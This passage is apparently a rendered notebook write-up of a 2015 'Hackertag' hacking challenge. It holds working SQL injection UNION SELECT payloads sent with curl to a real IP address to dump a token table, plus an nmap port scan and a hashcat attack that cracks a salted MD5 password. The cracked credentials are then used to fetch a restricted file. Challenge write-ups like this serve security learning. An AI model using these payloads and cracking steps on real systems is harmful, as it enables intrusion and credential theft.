+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;/liste.php?id=a&amp;quot;&amp;gt;token&amp;lt;/a&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;/liste.php?id=a&amp;quot;&amp;gt;public&amp;lt;/a&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;So there are 2 tables available:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;token&lt;/li&gt;
+&lt;li&gt;public&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;#39;s have a look at the schema of &lt;code&gt;token&lt;/code&gt;:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[101]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=NULL&amp;#39;%20UNION%20ALL%20SELECT%20&amp;#39;a&amp;#39;,sql%20FROM%20sqlite_master%20WHERE%20name=&amp;#39;token&amp;#39;;--#&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | grep &lt;span class="s2"&gt;&amp;quot;contentliquid&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;/liste.php?id=a&amp;quot;&amp;gt;CREATE TABLE token (token_val NUMERIC)&amp;lt;/a&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Ok, now go for it:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[102]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=NULL&amp;#39;%20UNION%20ALL%20SELECT%20&amp;#39;a&amp;#39;,token_val%20FROM%20token;--#&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | grep &lt;span class="s2"&gt;&amp;quot;contentliquid&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;/liste.php?id=a&amp;quot;&amp;gt;336809&amp;lt;/a&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Token &lt;strong&gt;336809&lt;/strong&gt; is the next one. &lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;h2 id="6th-and-last-Token"&gt;6th and last Token&lt;a class="anchor-link" href="#6th-and-last-Token"&gt;&amp;#182;&lt;/a&gt;&lt;/h2&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;While looking for tokens, I have seen this message a couple of times:&lt;/p&gt;
+&lt;p&gt;&lt;img src="http://dl.dornea.nu/img/2015/hackertag/08e649ee3231f07d05c42df5c11de2ab.png" alt="hackertag"&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;The realm says: &lt;strong&gt;80 is just a number of 65535&lt;/strong&gt;. Ok hat was a hint for more undetected ports. I&amp;#39;ve run &lt;em&gt;nmap&lt;/em&gt; again:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# nmap -sT -p 0-65535 82.195.79.41
+...
+Nmap scan report for 82.195.79.41
+Host is up (0.036s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+4141/tcp open  oirtgsvc
+7777/tcp open  cbt
+
+Nmap done: 1 IP address (1 host up) scanned in 2485.52 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;OH! What&amp;#39;s behind port &lt;strong&gt;4141&lt;/strong&gt;?&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[105]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;nc 82.195.79.41 4141
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;
+dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc:l0WMMMMMMMMMMMMMM
+dddddddddddddddddddddddxdddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNWMMMMM0:......o0NMMMMMMMMMMMM
+dddddddddddddddxxxxdddddddxxxxxddddddddddddddddddddddddddddddxO00kdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0,&amp;apos;,;cdOl..........&amp;apos;;cdNMMMMMMMM
+ddddddddddddddxKNNOdddddddOXNXkdddddddddddddddddddddddddddddxxXMMKxddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc....:Kk;............&amp;apos;KMMMMMMMM
+ddddddddddddddxNMW0dddddddOWMNkddddddddddddddddddddddddddddddxXMMKdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx;...lO0xc,.........cWMMMMMMMM
+ddddddddddddddxNMW0dddddddOWMNkdddxxkO000OkxddddddxkO000kxxdxxXMMKdddxO00OxddxKMMN00XWNKKKXNWWWXKKKNWMMMMMMWXKKKXNWMMMMMMMMMMMMMMMMMX:....:xKKxl,......kMMMMMMMMM
+ddddddddddddddxNMW0dddddddOWMNkddxOXWWWNWWWXkxddx0NWWWWWWN0xxxXMMKxdkKWWXOxddxKMMKddxkxxxxxx00kxxxdxONMMMWKkxxxxxxONMMMMMMMMMMMMMMMN0::;....,ckKKkoc:;dNMMMMMMMMM
+ddddddddddddddxNMMNKKKKKKKXWMNkddxKXXOxxkKWMNkdx0WWKOxxkXWW0dxXMMKxkNMW0xddxdxKMMKddkKNWNKxdxOXNNNOdd0WMWOxx0NWNKkdkNMMMMMMMMMMMMWK00OOkoo:&amp;apos;...&amp;apos;;ldxxl;dXMMMMMMMM
+ddddddddddddddxNMMNXXXXXXXNWMNkddddxkkOOO0NMWOdkNMXxddddxkOkdxXMMWXWMNOxdddxdxKMMKddONMMMWOxxKMMMMKxdkWMXxdx00000kxx0WMMMMMMMMMWNK00000000Okdc,.........;OWMMMMMM
+ddddddddddddddxNMW0ddddxddOWMNkddkKNWNXXXXWMWOdONMKxdddddxxxdxXMMNKXMWKxdddxdxKMMKddONMMMWOddKMMMMKxdkWMKddxO0000000XWMMMMMMMMMWNK00000000000Okxdxdlc:;;;cXMMMMMM
+ddddddddddddddxNMW0dddddddOWMNkxxKMMKxddxONMWOdxXMNkddxxk00OdxXMMKdxXWMXkxdxdxKMMKddONMMMWOddKMMMMKxdkWMXxdxXMMMMMMMMMMMMMMMMMMMMMWN00000000O00O0WMMMMMWWMMMMMMMM
+ddddddddddddddxNMW0dddddddOWMNkdd0WMN000KXWMWOddkNWNK00KNMNOdxXMMKddx0NMW0xddxKMMKddONMMMWOddKMMMMKxdkWMMKkxk0KKK0OKWMMMMMMMMMMMMMMWK000000000KWNWMMMMMMMMMMMMMMM
+ddddddddddddddx0KKkdddddddkKK0kdxxOKXNXXOx0KKOdddx0KXNNXK0kddxOKKOdxddkKKKkxdxKMMN00KWMMMMK00XMMMMN0OKWMMMWX0OkkOO0XWMMMMMMMMMMMMMMWK000000000NMMMMMMMMMMMMMMMMMM
+ddddddddddddddddddddddddddddddddxddxxxxxddddddddddddxxxxddddddddxddddddddddddxKMMMMMMMMMMMMMMMWXXNNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK000000000WMMMMMMMMMMMMMMMMMM
+ddddddddddddddx0kxdkOOxddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMWK0000KWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMX00000000KWMMMMMMMMMMMMMMMMMM
+ddddddddddddddxOkxkNX0xddxxxddxxxddxxxxddxxxdxxxxdddddxxxxdxdxxxxddxxxxxxddddxKMMMMMMMMMMMMMMN000000KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMW00000KK0d:cdKWMMMMMMMMMMMMMM
+ddddddddddddddkXOkKWX0xxdkKKxd0Kkx0XKKKOxOXkdkXKxdddx0KKKKOxOKKKKOxOXKKXXkdddxKMMMMMMMMMMMMMMMWNNXK00c&amp;apos;ckNMMMMMMMMMMMMMMMMMMMMMMMMMMMNKKXXXx,.....:kNMMMMMMMMMMMM
+ddddddddddddddkN0dON0xdddxONOkX0xON0xxKNk0NOdkNXxdddON0xk0Oxk0OOXXx0NOx0WKxddxKMMMMMMMMMMMMMMMMMMMMNk,...;dKWMMMMMMMMMMMMMMMMMMMMMMMMNKO0Kd.........;0WMMMMMMMMMM
+ddddddddddddddkN0dON0xddddx0XKXkxONOxxKNk0NOdkNXxdddONOxxOkkXXO0NXx0NkdOWKxddxKMMMMMMMMMMMMMMMMMMMMMMNOo:...cxKWMMMMMMMMMMMMMMMWNKkoc;ckol:&amp;apos;..........ckKNWMMMMMM
+ddddddddddddddkXOdkX0xdddddkNWOddx0XKXXOxxKXKKNKxddxx0XKXXOkKXKKXKx0XkdONKxddxKMMMMMMMMMMMMMMMMMMMMMMMMMWKxc...:ONMMMMMMMMWXOdl;.......&amp;apos;..,clc,..........&amp;apos;:dOKWMM
+ddddddddddddddxxxxxxxddddxk0X0xddddxxxxdddxxxxxxxddddxxxxxdxxxxxxxxxxxdxxxdddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXOd;.&amp;apos;:dkkxoc;,......&amp;apos;;:ldkOOo,.&amp;apos;;lol:,&amp;apos;..........,co
+dddddddddddddddddddddddddxkkxddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc&amp;apos;.....&amp;apos;,:lox0XNWMMMMMMMNo,..&amp;apos;;odddol:;,,,,&amp;apos;...
+dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNKOO0KNWWMMMMMMMMMMMMMMMMNOc&amp;apos;..,:ldxdddddddooo
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK:....;oddddxxdxxK
+
+*********************************************************
+Der folgende Hashwert (MD5) wurde mit dem Salt &amp;quot;Hackertag&amp;quot; erzeugt. 
+Der Aufruf war dabei wie folgt: echo -n &amp;quot;Hackertag{Passwort}&amp;quot; | md5sum
+
+d79a2543ddbb8042a6d14851fb098e0d
+
+*********************************************************
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;&lt;img src="http://dl.dornea.nu/img/2015/hackertag/61fe1a8df134387a58b7790a891c8443.png" alt="hackertag"&gt;&lt;/p&gt;
+&lt;p&gt;What it basically says, is that a certain MD5 hash was created using &lt;code&gt;echo -n &amp;quot;Hackertag{Password}&amp;quot;&lt;/code&gt;, where &lt;code&gt;Hackertag&lt;/code&gt; is a salt. And given the hash I should find out the right password. I have never used &lt;code&gt;hashcat&lt;/code&gt; before but this was the right time to do it. After reading some docs, I was able to get the right password in ca. 3 seconds :)&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[107]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;%%&lt;/span&gt;&lt;span class="k"&gt;bash&lt;/span&gt;
+&lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;d79a2543ddbb8042a6d14851fb098e0d&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;hash&lt;/span&gt;
+&lt;span class="n"&gt;hashcat&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;attack&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;Hackertag?l?l?l?l?l?l&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;Initializing hashcat v0.49 with 2 threads and 32mb segment-size...
+
+Added hashes from file hash: 1 (1 salts)
+Activating quick-digest mode for single-hash
+
+NOTE: press enter for status-screen
+
+
+Input.Mode: Mask (H) [1]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Ha) [2]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hac) [3]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hack) [4]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hacke) [5]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hacker) [6]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hackert) [7]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hackerta) [8]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hackertag) [9]
+Index.....: 0/1 (segment), 1 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 1/1 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hackertag?l) [10]
+Index.....: 0/1 (segment), 26 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 26/26 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hackertag?l?l) [11]
+Index.....: 0/1 (segment), 676 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 676/676 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+
+Input.Mode: Mask (Hackertag?l?l?l) [12]
+Index.....: 0/1 (segment), 17576 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, - words
+Progress..: 17576/17576 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+d79a2543ddbb8042a6d14851fb098e0d:Hackertagblue
+
+All hashes have been recovered
+
+Input.Mode: Mask (Hackertag?l?l?l?l) [13]
+Index.....: 0/1 (segment), 456976 (words), 0 (bytes)
+Recovered.: 1/1 hashes, 1/1 salts
+Speed/sec.: - plains, 5.03M words
+Progress..: 296192/456976 (64.82%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+Started: Wed Mar 18 21:45:47 2015
+Stopped: Wed Mar 18 21:45:47 2015
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;We can verify that:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[108]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;Hackertagblue&amp;quot;&lt;/span&gt; | md5sum
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;d79a2543ddbb8042a6d14851fb098e0d  -
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Perfect! Now we can use the passwort to access this link: &lt;a href="http://82.195.79.41/restricted/index.php"&gt;http://82.195.79.41/restricted/index.php&lt;/a&gt;. Inside you&amp;#39;ll see a image and nothing more:&lt;/p&gt;
+&lt;p&gt;&lt;img src="http://dl.dornea.nu/img/2015/hackertag/dc0eb3cacc8696cdbaa8604bfb89e25e.png" alt="hackertag"&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;But again let&amp;#39;s have a look at the image itself:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[117]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;%%&lt;/span&gt;&lt;span class="k"&gt;bash&lt;/span&gt;
+&lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;freddy&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;blue&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;82.195&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;79.41&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;restricted&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tour&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jpg&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;tour&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jpg&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;
+&lt;span class="n"&gt;strings&lt;/span&gt; &lt;span class="n"&gt;tour&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jpg&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;==&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;VG9rZW46IDU1MTI0Mw==
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;That looks interesting:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[119]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;VG9rZW46IDU1MTI0Mw==&amp;quot;&lt;/span&gt; | base64 -d
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;Token: 551243&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;That&amp;#39;s it! :)&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
